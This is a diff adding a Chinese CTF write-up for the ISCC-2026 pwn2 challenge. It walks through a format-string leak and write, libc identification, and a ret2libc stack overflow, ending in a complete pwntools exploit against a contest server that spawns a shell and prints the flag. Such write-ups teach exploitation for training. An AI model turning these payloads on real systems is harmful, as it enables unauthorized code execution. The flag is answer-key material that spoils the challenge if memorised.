@@ -1256,6 +1256,217 @@ r.sendline(payload_2)
 r.interactive()
 ```
 
+## [ISCC-2026 练武pwn2]
+
+
+
+::alert{type="question"}
+[题目链接](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/ISCC-2026-PWN/iscc/pwn2 - 副本)
+::
+
+这个题目挺有意思的，算是一种libc的加强版
+
+### 0x01 程序信息
+
+基础分析，先看看程序的信息是什么
+
+![image-20260529230630168](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085537418-402723785.png)
+
+| Arch     | i386-32-little     |
+| -------- | ------------------ |
+| RELRO    | Partial RELRO      |
+| Stack    | No canary found    |
+| NX       | NX enabled         |
+| PIE      | No PIE (0x8048000) |
+| Stripped | No                 |
+
+可以发现的是程序没有canary保护，同时PIE并没有开启，地址固定
+
+---
+
+### 0x02 分析程序
+
+
+
+#### main()
+
+![image-20260529230412881](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085536451-1717111564.png)
+
+```c
+char buf[32];
+puts("Ready to begin...");
+puts("Hope you have a good time here.");
+read(0, buf, 32);
+printf(buf);                          // [1] format string
+if (*(0x0804C030) == 5) vuln();       // [2] need target_val == 5
+```
+
+#### vuln()
+
+![image-20260529230455216](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085535641-1417935358.png)
+
+```c
+char buf[144];
+write(1, "Input:\n", 7);
+read(0, buf, 256);                    // [3] stack overflow
+```
+
+根据函数结构，出现一个printf的字符串漏洞和vuln函数栈溢出，同时使用
+
+:key{code="F12" ctrl shift}并没有出现/bin/sh和system字符串。使用ROPgadget同理，那这题应该就是ret2libc，通过libc库寻找system和/bin/sh
+
+目前有的思路是通过main()中的``if ( *(_DWORD *)x == 5 )``进入漏洞函数。
+
+``*(_DWORD *)x``实际是`int* x` 实际指向的是target_val
+
+![image-20260529231731501](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085534973-489418740.png)
+
+---
+
+#icon
+ヾ(•ω•`)o
+#default
+先简单发送字符串看看怎么个事情
+::
+
+```python
+from pwn import *
+
+context(os='linux',arch = 'i386')
+
+r = process("./attachment-9")
+
+payload = b"AAAA,%p,%p,%p,%p,%p,%p,%p"
+
+r.sendline(payload)
+
+r.interactive()
+
+```
+
+![image-20260529234019957](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085533744-779863317.png)
+
+可以发现在栈第4个地址发现了字符串AAAA，这个地方就是s字符串的开始
+
+### 0x03 攻击思路
+
+```c
+Stage 1: 格式化字符串
+  ├── %8$n  → target_val = 5 (开门进 vuln)
+  └── %9$s  → leak puts@GOT (泄露 libc)
+
+Stage 2: ret2libc
+  ├── 144(buf) + 4(ebp) = 148 padding
+  └── system + dummy_ret + /bin/sh
+
+Stage 3: getshell → cat /flag*
+```
+
+格式化字符串布局（32bytes）
+
+```asm
+Offset  Content          Why
+──────────────────────────────────────
+ 0      %5c%8$n         写5到target_val
+ 8      |AAAAAAA        标记(解析用)
+16      p32(0x0804C030)  %8$n指向的地址
+20      p32(0x0804C014)  %9$s读取的地址
+24      %9$s            泄露puts
+28      LEAK            结束标记
+```
+
+溢出布局 (4+148 = 152 bytes)
+
+```asm
+Offset  Content
+──────────────────────────
+ 0      144 bytes      buf padding
+144     4 bytes        saved_ebp
+148     system_addr    ret addr
+152     0xdeadbeef     system's ret (dummy)
+156     binsh_addr     arg1: "/bin/sh"
+```
+
+---
+
+### 0x04 libc 版本识别
+
+libc.rip 输入 puts 末三字节 `0x1e0`，匹配到：
+
+```asm
+libc6-i386_2.31-0ubuntu9.17
+  puts:   0x0006d1e0
+  system: 0x00041360
+  /bin/sh:0x0018c363
+```
+
+---
+
+### 0x05 Exploit
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'i386'
+context.log_level = 'info'
+
+TARGET_VAL = 0x0804c030
+PUTS_GOT   = 0x0804c014
+PUTS_OFF   = 0x6d1e0
+SYSTEM_OFF = 0x41360
+BINSH_OFF  = 0x18c363
+
+r = remote('39.96.193.120', 10000)
+r.recvuntil(b'here.\n')
+
+# Stage 1: fmt string -> write target_val + leak puts
+fmt  = b'%5c%8$n|AAAAAAAA'
+fmt += p32(TARGET_VAL)
+fmt += p32(PUTS_GOT)
+fmt += b'%9$s'
+fmt += b'LEAK'
+
+r.send(fmt)
+resp = r.recvuntil(b'Input:\n')
+
+aaaa = resp.find(b'AAAAAAAA')
+leak_raw = resp[aaaa + 8 + 8:resp.find(b'LEAK')]
+puts_addr = u32(leak_raw[:4])
+log.success(f'puts = {hex(puts_addr)}')
+
+libc = puts_addr - PUTS_OFF
+system_addr = libc + SYSTEM_OFF
+binsh_addr = libc + BINSH_OFF
+
+# Stage 2: overflow ret2libc
+payload  = b'A' * 148
+payload += p32(system_addr)
+payload += p32(0xdeadbeef)
+payload += p32(binsh_addr)
+
+r.send(payload)
+
+import time
+time.sleep(0.5)
+r.sendline(b'cat /flag*')
+time.sleep(0.5)
+print(r.recv(timeout=3).decode('latin-1'))
+r.interactive()
+```
+
+---
+
+### 0x06 Flag
+
+```
+ISCC{e2d72fc8-fd71-4339-a79f-43a23013d374}
+```
+
+
+
+
+
 ```md wrap
 pwn-ret2libc基础知识点，包含题目
 ```
